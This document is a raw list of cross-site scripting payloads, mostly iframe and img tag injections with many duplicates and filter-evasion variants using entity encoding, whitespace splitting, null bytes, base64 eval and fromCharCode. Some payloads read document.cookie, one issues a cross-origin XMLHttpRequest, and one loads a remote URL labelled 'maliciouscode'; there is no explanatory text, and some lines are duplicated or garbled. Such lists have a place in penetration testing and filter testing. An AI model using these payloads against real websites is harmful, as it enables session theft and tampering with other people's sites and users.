>"<IfRaMe sRc=hTtp://vulnerability-lab.com></IfRaMe>
<iframe src=http://vulnerability-lab.com/index.html <
<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
<IFRAME/SRC=JAVASCRIPT:%61%6c%65%72%74%28%31%29></iframe> // Cross Browser (PEPE Vila)
<iframe src="javascript:alert(1)"></iframe>
<iframe src="javascript:alert(1)"></iframe>
<iframe src="javascript:alert(1)"></iframe>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<iframe src="javascript:document.cookie=true;>
>"<iframe src="javascript:document.cookie=true;>
<IFRAME SRC="javascript:document.cookie=true;"></IFRAME>
>"<IFRAME SRC="javascript:document.cookie=true;"></IFRAME>
<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ​
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
"><iframe src='' onload=alert('mphone')>
<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>
<iframe/src \/\/onload = prompt(1)
<iframe/src \/\/onload = prompt(1)
<iframe/src \/\/onload = prompt(1)
<iframe/src \/\/onload = prompt(1)
<iframe/src \/\/onload = prompt(1)
<iframe/src \/\/onload = prompt(1)
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<iframe src=%(scriptlet)s <
<iframe src=%(scriptlet)s <
<iframe src="vbscript:msgbox(1)"></iframe> (IE)
<iframe src="\x01javascript:alert(0)"></iframe> <!-- Example for Chrome -->
<iframe src="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"></iframe>
<iframe src=x onerror=prompt(1)>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<iframe xmlns="#" src="javascript:alert(1)"></iframe>
<!--[if]><script>javascript:alert(1)</script -->
<!--[if]><script>javascript:alert(1)</script -->
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<image src="javascript:alert(1)">
<image src="javascript:alert(1)">
&i=mandelbrot&a=*C.mandelbrot-_*Formula.dflt-&f2=-0.5&f=MandelbrotSet.rec_-0.5&f3=666&f=MandelbrotSet.imc_666%22%20alt=%22MandelbrotSet.imc%22%20%20name=f3%20/%3E%3Cbody%20onload=alert%28%22XSS%22%29%3E%3Cspan
<IMG
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>
&img=%27%3C/script%3E%3Ch1%20style=%27font-size:200px;color:red;position:absolute;top:0px;left:0px;background-color:black%27%3EXSS%3C/h1%3E
<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
<IMG DYNSRC="javascript:alert('CrossSiteScripting')">
<IMG DYNSRC="javascript:alert('XSS');">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<img dynsrc="javascript:document.cookie=true;">
>"<img dynsrc="javascript:document.cookie=true;">
<IMG DYNSRC="javascript:document.cookie=true;">
>"<IMG DYNSRC="javascript:document.cookie=true;">
<IMG DYNSRC="javascript:javascript:alert(1)">
<IMG DYNSRC="javascript:javascript:alert(1)">
<img language=vbscript src=<b onerror="alert 1"> // IE 8
<IMG LOWSRC="javascript:alert('CrossSiteScripting')">
<IMG LOWSRC="javascript:alert('XSS');">
<IMG LOWSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:document.cookie=true;">
>"<IMG LOWSRC="javascript:document.cookie=true;">
<IMG LOWSRC="javascript:javascript:alert(1)">
<IMG LOWSRC="javascript:javascript:alert(1)">
"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
<IMG onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG """><SCRIPT>alert("CrossSiteScripting")</SCRIPT>">
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
<img/src=`%00` onerror=this.onerror=confirm(1)
<img/src=`%00` onerror=this.onerror=confirm(1)
<img/src=`%00` onerror=this.onerror=confirm(1)
<img/src=`%00` onerror=this.onerror=confirm(1)
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>
<IMG SRC=" &#14;  javascript:alert('XSS');">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>
<img src='1' onerror='alert(0)' <
<img src='1' onerror/=alert(0) />
<img src='1''onerror='alert(0)'>
<img src='1'"onerror="alert(0)">
<img src='1'onerror=alert(0)>
<img/src='1'/onerror=alert(0)>
<img src="1" onerror="alert('1')">
<img src="1" onerror="alert(1)" />
<img src="1" onerror="alert(1)" />
<img src='1' onerror=\x00alert(0) />
<img src='1' onerror\x00=alert(0) />
<img src='1' onerror\x0b=alert(0) />
<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
<img src="1" onnerror="alert(1)">
<img src='1' o\x00nerr\x00or=alert(0) />
<img src='1'\x00onerror=alert(0)>
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<img/src=aaa.jpg onerror=prompt(1);>
<img src="a" onerror='eval(atob("cHJvbXB0KDEpOw=="))'>
<img src=a onerror=setInterval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))> // Using String.fromcharcode function
<img src=asdf onerror=alert(document.cookie)>
<img src="blah>" onmouseover="document.cookie=true;">
<img src="blah"onmouseover="document.cookie=true;">
>"<img src="blah>" onmouseover="document.cookie=true;">
>"<img src="blah"onmouseover="document.cookie=true;">
<img src=&{document.cookie=true;};>
>"<img src=&{document.cookie=true;};>
<img src=foo.png onerror=alert(/xssed/) />
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
<IMG SRC="http://www.vulnerability-lab.com/file.php?variables=malicious">
<img src="http://www.w3schools.com/tags/planets.gif" width="145" height="126" alt="Planets" usemap="#planetmap"><map name="planetmap"><area shape="rect" coords="0,0,145,126" a-=">" href="j&#x61;vascript:&#x61;lert(-1)"></map>
<!--<img src="--><img src=x onerror=alert(123)//">
<!--<img src="--><img src=x onerror=alert(XSS)//">
<![><img src="]><img src=x onerror=alert(XSS)//">
<!--<img src="--><img src=x onerror=javascript:alert(1)//">
<!--<img src="--><img src=x onerror=javascript:alert(1)//">
<![><img src="]><img src=x onerror=javascript:alert(1)//">
<![><img src="]><img src=x onerror=javascript:alert(1)//">
<img src ?itworksonchrome?\/onerror = alert(1)
<img src ?itworksonchrome?\/onerror = alert(1)
<img src ?itworksonchrome?\/onerror = alert(1)
<img src ?itworksonchrome?\/onerror = alert(1)
<img src ?itworksonchrome?\/onerror = alert(1)???
<img src ?itworksonchrome?\/onerror = alert(1)​​​
<img src="javascript:alert(1)">
<img src="javascript:alert(1)">
<IMG SRC=&{javascript:alert(1);};>
<IMG SRC=&{javascript:alert(1);};>
<IMG SRC="   javascript:alert('CrossSiteScripting');">
<IMG SRC="jav  ascript:alert('CrossSiteScripting');">
<IMG SRC="javascript:alert('CrossSiteScripting');">
<IMG SRC="javascript:alert('CrossSiteScripting')"
<IMG SRC=javascript:alert('CrossSiteScripting')>
<IMG SRC=javascript:alert("CrossSiteScripting")>
<IMG SRC=JaVaScRiPt:alert('CrossSiteScripting')>
<img src=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=`javascript:alert("RM'CrossSiteScripting'")`>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG SRC=`javascript:alert("RSnake says### 'XSS'")`>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=javascript:alert(String.fromCharCode(88###83###83))>
<img src="javascript:alert('XSS');">
<img src="javascript:alert('XSS')">
<IMG SRC="jav    ascript:alert('XSS');">
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="javascript:alert('XSS');">
<IMG SRC="javascript:alert('XSS');">
<IMG SRC="javascript:alert('XSS');">
<IMG SRC="javascript:alert('XSS');">
<IMG SRC="javascript:alert('XSS');">
<IMG SRC="javascript:alert('XSS');">
<IMG SRC="javascript:alert('XSS')"
<IMG SRC="javascript:alert('XSS')"
<IMG SRC="javascript:alert('XSS')"
<IMG SRC="javascript:alert('XSS')"
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG SRC=javascript:alert("XSS")>
<IMGSRC="javascript:alert('XSS')">
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<img src="javascript:document.cookie=true;">
>"<img src="javascript:document.cookie=true;">
<IMG SRC="  javascript:document.cookie=true;">
<IMG SRC="jav ascript:document.cookie=true;">
<IMG SRC="javascript:document.cookie=true;">
<IMG SRC="javascript:document.cookie=true;">
>"<IMG SRC="  javascript:document.cookie=true;">
>"<IMG SRC="jav ascript:document.cookie=true;">
>"<IMG SRC="javascript:document.cookie=true;">
